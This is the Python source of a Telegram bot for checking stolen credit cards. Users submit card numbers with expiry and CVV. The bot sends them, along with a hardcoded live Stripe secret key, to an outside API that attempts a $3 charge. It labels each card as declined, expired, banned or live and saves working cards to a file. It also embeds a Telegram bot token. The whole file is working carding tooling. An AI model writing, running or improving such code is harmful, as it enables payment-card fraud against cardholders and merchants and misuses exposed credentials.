import requests
import time
import json
import os
from telegram import Update
from telegram.ext import CommandHandler, CallbackContext, Application

MAX_RETRIES = 5

# Function to check the CC
async def check_cc(cc, amount, currency, bot, chat_id, username, vip_status, retry_count=0):
    if retry_count > MAX_RETRIES:
        await bot.send_message(chat_id=chat_id, text=f"{cc} Max retries exceeded.")
        return

    url = "https://api.mvy.ai/"
    params = {
        "lista": cc,
        "sk": "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",
        "amount": amount,
        "currency": currency,
    }

    try:
        start_time = time.time()
        response = requests.get(url, params=params)
        end_time = time.time()
        total_time = end_time - start_time

        # Check if response is empty or not in JSON format
        if not response.text:
            result = f"{cc} Empty response ❌ Time Taken: {total_time:.2f} seconds"
        else:
            response_data = response.json()
            status = response_data.get('status', '')
            message = response_data.get('message', '')
            amount = response_data.get('payment_info', {}).get('amount', '')
            currency = response_data.get('payment_info', {}).get('currency', '')
            risk = response_data.get('payment_info', {}).get('risk_level', '')
            receipt_url = response_data.get('payment_info', {}).get('receipt_url', '')
            api_time = response_data.get('rate_limit', {}).get('time_taken', '')

            if 'fraudulent' in message:
                result = f"Fraudulent ❌"
            elif 'generic_decline' in message:
                result = f"GENERIC DECLINED ❌"
            elif 'ERR013' in message:
                result = f"THE FUCKING BIN IS BANNED ❌"
            elif 'ERR012' in message:
                result = f"THE CARD IS FUCKING EXPIRED BRUH ❌"
            elif 'Your card number is incorrect' in message:
                result = f"YOUR CARD NUMBER IS INCORRECT ❌"
            else:
                result = f"{message} ✅"
                save_live_response(cc, message)

        response_message = f"""
♤ 𝗖𝗮𝗿𝗱 : <code>{cc}</code>
♤ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {result} {receipt_url}
♤ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 : 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗩𝗩 3$

♤ 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 : {total_time:.2f}s
♤ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : @{username} <b>[{vip_status}]</b>
♤ 𝐁𝐨𝐭 : <b>@test</b>
♤ 𝗥𝗶𝘀𝗸 : <b>{risk}</b>
"""

        await bot.send_message(chat_id=chat_id, text=response_message, parse_mode='HTML', disable_web_page_preview=True)

    except requests.exceptions.RequestException as e:
        await bot.send_message(chat_id=chat_id, text=f"{cc} Request Exception: {str(e)}. Retrying ({retry_count + 1}/{MAX_RETRIES + 1})...")
        time.sleep(1)
        await check_cc(cc, amount, currency, bot, chat_id, username, vip_status, retry_count + 1)

    except json.JSONDecodeError as e:
        await bot.send_message(chat_id=chat_id, text=f"{cc} JSON Decode Error: {str(e)}")

def save_live_response(cc, message):
    with open('Live.txt', 'a') as file:
        file.write(f"CC: {cc}\n")
        file.write(f"Response: {message}\n\n")

def is_vip(user_id):
    with open("vip.txt", "r") as f:
        vip_users = f.readlines()
    return str(user_id) + "\n" in vip_users

async def xvv(update: Update, context: CallbackContext):
    try:
        cc = context.args[0]
        parts = cc.split('|')
        if len(parts[2]) == 2:
            parts[2] = '20' + parts[2]
        formatted_cc = ':'.join(parts)
    except IndexError:
        await update.message.reply_text(f"{update.effective_user.username} pls provide cc")
        return
    except Exception:
        await update.message.reply_text(f"{update.effective_user.username} why providing wrong information")
        return

    amount = 3.0
    currency = "usd"
    bot = context.bot
    chat_id = update.effective_chat.id
    username = update.effective_user.username
    user_id = update.effective_user.id
    vip_status = "OWNER" if is_vip(user_id) else "FREE"

    await check_cc(formatted_cc, amount, currency, bot, chat_id, username, vip_status)

def main():
    bot_token = "7266886772:AAFbSsQc2EiIXZ5XBoU2H7m9ci6mevp7LKQ"
    application = Application.builder().token(bot_token).build()
    application.add_handler(CommandHandler("xvv", xvv))
    application.run_polling()

if __name__ == "__main__":
    main()
